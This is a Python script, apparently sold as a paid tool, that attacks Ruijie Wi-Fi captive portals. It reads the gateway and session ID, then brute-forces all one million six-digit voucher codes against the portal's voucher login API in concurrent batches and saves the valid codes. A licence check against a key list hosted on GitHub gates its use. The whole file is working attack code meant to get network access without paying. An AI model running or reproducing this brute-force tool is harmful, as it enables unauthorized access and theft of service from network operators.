import os
import re
import sys
import zlib
import json
import time
import ping3
import ntplib
import base64
import random
import string
import urllib
import asyncio
import aiohttp
import hashlib
import argparse
import requests
import subprocess
from datetime import datetime, timedelta
from urllib.parse import quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# --- Configuration & Colors ---
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

def clear():
    os.system("clear")

def Line():
    print(f"{y}-" * os.get_terminal_size()[0] + f"{w}")

def Logo():
    clear()
    banner = f"""{r}
 __  __            __     __     
|  \/  |           \ \   / /     
| \  / | ___   ___  \ \_/ /   _  
| |\/| |/ _ \ / _ \  \   / | | | 
| |  | | (_) |  __/   | |  | |_| 
|_|  |_|\___/ \___|   |_|   \__,_|
{g}        RUIJIE BYPASS PRO ENGINE v22.0
{w}-----------------------------------------
[*] Developer: {y}Moe Yu{w}
[*] Status: {g}Premium Activated{w}
-----------------------------------------"""
    print(banner)

# --- Security System (Key & Expiration) ---
def get_uid():
    # Device UID ထုတ်ယူခြင်း
    uid_base = str(os.getlogin()) + str(os.getuid())
    return hashlib.md5(uid_base.encode()).hexdigest()[:15].upper()

def get_network_time():
    try:
        client = ntplib.NTPClient()
        response = client.request('pool.ntp.org', timeout=5)
        return datetime.fromtimestamp(response.tx_time)
    except:
        return datetime.now()

def check_security():
    uid = get_uid()
    current_time = get_network_time()
    try:
        # GitHub မှ Key List ကို လှမ်းစစ်ခြင်း
        resp = requests.get(KEY_URL, timeout=10).text
        for line in resp.splitlines():
            if "~" in line:
                db_uid, exp_date_str = line.split("~")
                if db_uid.strip() == uid:
                    # Format: mm-hh-dd-MM-yyyy (မူရင်း code အတိုင်း)
                    exp_dt = datetime.strptime(exp_date_str.strip(), "%M-%H-%d-%m-%Y")
                    if exp_dt > current_time:
                        return True
                    else:
                        print(f"{r}[!] Key Expired! Please renew.{w}")
                        sys.exit()
        
        Logo()
        print(f"{r}[!] Key Not Found in Database!{w}")
        print(f"{y}[>] Your UID: {w}{uid}")
        print(f"{g}[*] Send this UID to Moe Yu to buy a key.{w}")
        sys.exit()
    except Exception as e:
        print(f"{r}[!] Connection Error: {w}{str(e)}")
        sys.exit()

# --- Core Logic: Setup & Attack ---
class Setup:
    def run(self):
        Logo()
        print(f"{b}[*] Scanning Ruijie Gateway...{w}")
        try:
            # Router IP ရှာဖွေခြင်း
            res = requests.get("http://192.168.0.1", timeout=10)
            gw_ip = re.search(r'gw_address=(.*?)&', res.url).group(1)
            
            # Session URL ဖမ်းယူခြင်း
            req_text = requests.get(res.url).text
            session_part = re.search(r"href='(.*?)'</script>", req_text).group(1)
            session_url = "https://portal-as.ruijienetworks.com" + session_part
            
            with open(".ip", "w") as f: f.write(gw_ip)
            with open(".session_url", "w") as f: f.write(session_url)
            
            print(f"{g}[+] Setup Success! Gateway: {gw_ip}{w}")
            print(f"{g}[+] Configuration Saved.{w}")
        except:
            print(f"{r}[!] Error: Connect to Ruijie Wi-Fi first!{w}")

async def login_voucher(session, sid, voucher):
    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    data = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
    try:
        async with session.post(url, json=data) as resp:
            res = await resp.json()
            if 'logonUrl' in str(res):
                print(f"{g}[SUCCESS] {voucher}{w}")
                with open("success.txt", "a") as f: f.write(voucher + "\n")
            else:
                pass # တိတ်ဆိတ်စွာ ကျော်သွားမည်
    except:
        pass

async def start_attack():
    if not os.path.exists(".session_url"):
        print(f"{r}[!] Please run setup first! (-o setup){w}")
        return
        
    session_url = open(".session_url").read().strip()
    Logo()
    print(f"{b}[*] Initializing Attack...{w}")
    
    async with aiohttp.ClientSession() as session:
        async with session.get(session_url) as r:
            try:
                sid = re.search(r"sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
            except:
                print(f"{r}[!] Failed to get Session ID. Setup again.{w}")
                return

        # ဥပမာ Digit 6 လုံး brute force
        print(f"{g}[*] Brute-forcing Vouchers...{w}")
        tasks = []
        for i in range(1000000): # 000000 to 999999
            voucher = str(i).zfill(6)
            tasks.append(login_voucher(session, sid, voucher))
            if len(tasks) >= 50: # Batch processing for speed
                await asyncio.gather(*tasks)
                tasks = []

# --- Main Entry Point ---
async def main():
    check_security() # Key အရင်စစ်မည်
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["setup", "attack"], required=True)
    args = parser.parse_args()
    
    if args.option == "setup":
        Setup().run()
    elif args.option == "attack":
        await start_attack()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{y}[!] Stopped by user.{w}")
